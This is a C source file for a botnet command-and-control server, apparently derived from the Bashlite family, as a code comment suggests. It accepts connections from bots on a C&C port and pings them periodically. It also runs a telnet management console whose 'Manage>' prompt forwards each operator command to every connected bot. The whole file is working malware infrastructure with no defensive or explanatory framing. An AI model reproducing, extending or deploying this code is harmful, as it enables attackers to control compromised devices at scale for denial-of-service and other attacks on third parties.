#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "constants.h"
#include "protocol.h"
#include "util.h"
#include "rand.h"

void *get_in_addr(struct sockaddr *sa);
void broadcast(char *msg, int ourfd);
ssize_t fdgets(unsigned char *buffer, int len, int fd);
void *new_connection_thread(void *dummy);
void *telnet_listener(void *dummy);
void *telnet_worker(void *fd);

int fdmax;
int listener;
fd_set master;

int main(void) {
    pthread_t new_conn_thread, telnet_thread;

    signal(SIGPIPE, SIG_IGN); /* ignore sigpipes */
    close(STDOUT_FILENO); /* give us another fd as we never use these anyways */
    close(STDIN_FILENO);

    FD_ZERO(&master); /* clear the master sets */

    /* start connection handler thread and telnet management threads */
    pthread_create(&new_conn_thread, NULL, &new_connection_thread,
                   (void *)NULL);
    pthread_create(&telnet_thread, NULL, &telnet_listener,
                   (void *)NULL); /* start telnet remote manager thread */

    while (1) { /* main thread */
        broadcast("p", listener);
        sleep(60+rand_range(1, 24));
    }

    /* cleanup threads */
    pthread_cancel(new_conn_thread);
    pthread_cancel(telnet_thread);
    pthread_join(new_conn_thread, NULL); /* delete new connection handler pthread */
    pthread_join(telnet_thread, NULL); /* delete telnet worker pthread */
    pthread_exit(NULL);
    return (EXIT_SUCCESS);
}

void broadcast(char *msg, int ourfd) {
    int i;
#ifdef DEBUG
    int success = 0;
#endif

    for (i = 0; i <= fdmax; i++) {
        if (FD_ISSET(i, &master)) {
            /* except listener and ourselves */
            if (i != listener && i != ourfd) {
                if (protocol_format_send_msg(i, msg, &master) == -1) {
#ifdef DEBUG
                    fprintf(stderr,
                            "[-] Socket %d hung up, closing and removing from "
                            "fd_set list\n",
                            i);
#endif
                    close(i);
                    FD_CLR(i, &master);
                }
#ifdef DEBUG
                else {
                    ++success;
                }
#endif
            }
        }
    }
#ifdef DEBUG
    fprintf(stderr, "[+] %d bots online\n", success);
#endif
}

ssize_t fdgets(unsigned char *buffer, int len, int fd) {
    ssize_t got;
    ssize_t total;
    got = 1;
    total = 0;
    while (got == 1 && total < len && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    buffer[total - 1] = '\0'; /* stop at newline */
    return got;
}

void *get_in_addr(struct sockaddr *sa) {
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in *)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6 *)sa)->sin6_addr);
}

void *telnet_listener(void *dummy) { /* bashlite */
    int yes;
    int sockfd, client_fd;
    socklen_t len;
    struct sockaddr_in sa, remote_addr;
    pthread_t thread;

    yes = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == -1) {
        die("socket");
    }

    if ((setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))) ==
        -1) {
        die("setsockopt");
    }

    memset(&sa, '\0', sizeof(sa));
    memset(&remote_addr, '\0', sizeof(remote_addr));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons(MGM_PORT);

    if (bind(sockfd, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
        die("socket");
    }

    if (listen(sockfd, 5) == -1) { /* dont need as large backlog as for cnc */
        die("listen");
    }

    len = sizeof(remote_addr);
    while (1) {
        client_fd = accept(sockfd, (struct sockaddr *)&remote_addr, &len);
        if (client_fd == -1) {
#ifdef DEBUG
            perror("accept");
#endif
        }
        pthread_create(&thread, NULL, &telnet_worker, (void *)client_fd);
        pthread_join(thread, NULL);
    }
    return NULL;
}

void *telnet_worker(void *fd) {
    int sock;
    char *prompt;
    char buf[MAX_MSG_SIZE - 2];

    sock = (int)fd; /* dereference */
    prompt = "\x1b[31mManage> \x1b[0m";
    memset(buf, '\0', sizeof(buf) / sizeof(char));
    while (fdgets((unsigned char *)buf, sizeof(buf) / sizeof(char), sock) > 0) {
        if (send_all(sock, prompt, strlen(prompt)) == -1) goto end;
        if (strlen(buf) == 0) goto end;
#ifdef DEBUG
        fprintf(stderr, "Command issued: \"%s\"\n", buf);
#endif
        broadcast(buf, sock); /* send command to all bots */
        memset(buf, '\0', sizeof(buf) / sizeof(char));
    }

    return NULL;
end:
    close(sock);
    return NULL;
}

void *new_connection_thread(void *dummy) {
    int newfd; /* newly accept()ed socket descriptor */
    int i, yes;
    fd_set read_fds; /* temp file descriptor list for select() */
    socklen_t addrlen;
    char remoteIP[INET6_ADDRSTRLEN];
    struct sockaddr_in remoteaddr, sa; /* client address */

    FD_ZERO(&read_fds);

    listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listener == -1) {
        die("socket");
    }

    yes = 1; /* for setsockopt() SO_REUSEADDR, below */
    if ((setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))) ==
        -1) {
        die("setsockopt");
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons(CNC_PORT);

    if (bind(listener, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
        close(listener);
        die("bind");
    }

    if (listen(listener, SOMAXCONN) ==
        -1) { /* allow largest possible backlog */
        die("listen");
    }

    if (make_socket_non_blocking(listener) == -1) {
        die("failed to make socket non blocking with fcntl");
    }

    /* add the listener to the master set */
    FD_SET(listener, &master);

    /* keep track of the biggest file descriptor */
    fdmax = listener; /* so far, it's this one */

    /* main loop */
    while (1) {
        read_fds = master;
        if (select(fdmax + 1, &read_fds, NULL, NULL, NULL) == -1) {
            die("select");
        }
        /* run through the existing connections looking for data to read */
        for (i = 0; i <= fdmax; i++) {
            if (FD_ISSET(i, &read_fds)) { /* we got one!! */
                if (i == listener) {
                    /* handle new connections */
                    addrlen = sizeof remoteaddr;
                    newfd = accept(listener, (struct sockaddr *)&remoteaddr,
                                   &addrlen);
                    if (newfd == -1) {
#ifdef DEBUG
                        perror("accept");
#endif
                    } else {
                        FD_SET(newfd, &master); /* add to master set */
                        if (newfd > fdmax) {    /* keep track of the max */
                            fdmax = newfd;
                        }
#ifdef DEBUG
                        fprintf(stderr,
                                "server: new connection from %s on "
                                "socket %d\n",
                                inet_ntop(
                                    remoteaddr.sin_family,
                                    get_in_addr((struct sockaddr *)&remoteaddr),
                                    remoteIP, INET6_ADDRSTRLEN),
                                newfd);
#endif
                    }
                } /* END handle data from client */
            }     /* END got new incoming connection */
        }         /* END looping through file descriptors */
    }             /* END for(;;)--and you thought it would never end! */
    close(listener);
}